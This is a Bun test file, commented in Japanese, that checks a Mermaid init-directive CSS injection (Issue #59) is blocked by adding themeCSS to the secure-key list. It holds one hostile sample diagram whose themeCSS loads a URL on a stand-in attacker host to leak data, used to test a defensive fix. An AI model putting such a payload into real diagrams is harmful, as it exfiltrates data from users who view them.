import { beforeAll, describe, expect, test } from "bun:test";
import { JSDOM } from "jsdom";
import { MERMAID_SECURE_KEYS } from "../public/mermaid-config.js";

/**
 * Issue #59: Mermaid の init directive (`%%{init: {...}}%%`) 経由の CSS 注入を検証する。
 *
 * `securityLevel: "strict"` の既定 secure リストは themeCSS を保護しないため、悪意ある md が
 * themeCSS を上書きすると mermaid.run() が sanitize 後に生成する SVG の `<style>` に任意 CSS が
 * 入り (インライン SVG は文書全体へ作用) CSS exfiltration が成立していた。initMermaid が
 * MERMAID_SECURE_KEYS を secure に渡すことで directive からの上書きを禁止する。
 *
 * jsdom で mermaid を描画するために最小限のブラウザ global を用意する (getBBox は未実装)。
 */
type MermaidModule = {
  initialize: (config: Record<string, unknown>) => void;
  render: (id: string, text: string) => Promise<{ svg: string }>;
};

let mermaid: MermaidModule;
const ATTACKER = "attacker.example";
const EVIL_DIAGRAM =
  `%%{init: {"themeCSS": ".x{background:url(https://${ATTACKER}/leak)}"}}%%\n` +
  "graph LR\n  A-->B";

beforeAll(async () => {
  const dom = new JSDOM("<!DOCTYPE html><body></body>", { pretendToBeVisual: true });
  for (const k of [
    "window",
    "document",
    "navigator",
    "CSSStyleSheet",
    "DOMParser",
    "Element",
    "SVGElement",
    "MutationObserver",
    "getComputedStyle",
  ]) {
    const v = (dom.window as unknown as Record<string, unknown>)[k];
    if (v !== undefined) (globalThis as unknown as Record<string, unknown>)[k] = v;
  }
  // jsdom はレイアウトを実装しないため getBBox を固定値で shim する (サイズは検証に無関係)。
  (dom.window.SVGElement.prototype as unknown as { getBBox: () => DOMRect }).getBBox = () =>
    ({ x: 0, y: 0, width: 100, height: 100 }) as DOMRect;
  mermaid = ((await import("mermaid")) as { default: MermaidModule }).default;
});

describe("Mermaid の init directive による CSS 注入 (Issue #59)", () => {
  test("MERMAID_SECURE_KEYS は themeCSS / fontFamily / altFontFamily と 11.x 既定を含む", () => {
    for (const k of ["themeCSS", "fontFamily", "altFontFamily"]) {
      expect(MERMAID_SECURE_KEYS).toContain(k);
    }
    // mermaid 11.x の既定 secure キー (既存保護を弱めていないこと)
    for (const k of ["securityLevel", "startOnLoad", "maxTextSize", "maxEdges"]) {
      expect(MERMAID_SECURE_KEYS).toContain(k);
    }
  });

  test("secure に themeCSS を含めると directive の themeCSS は SVG へ注入されない (遮断)", async () => {
    mermaid.initialize({
      startOnLoad: false,
      securityLevel: "strict",
      secure: [...MERMAID_SECURE_KEYS],
      theme: "default",
    });
    const { svg } = await mermaid.render("secure-test", EVIL_DIAGRAM);
    expect(svg).not.toContain(ATTACKER);
  });

  test("対照: secure から外すと themeCSS が SVG へ注入される (脆弱性が実在したことの証明)", async () => {
    // MERMAID_SECURE_KEYS から themeCSS を除いた設定では directive が通ることを確認し、
    // 上のテストが「本当に themeCSS 保護を検証している」ことを担保する。
    mermaid.initialize({
      startOnLoad: false,
      securityLevel: "strict",
      secure: MERMAID_SECURE_KEYS.filter((k) => k !== "themeCSS"),
      theme: "default",
    });
    const { svg } = await mermaid.render("insecure-test", EVIL_DIAGRAM);
    expect(svg).toContain(ATTACKER);
  });
});
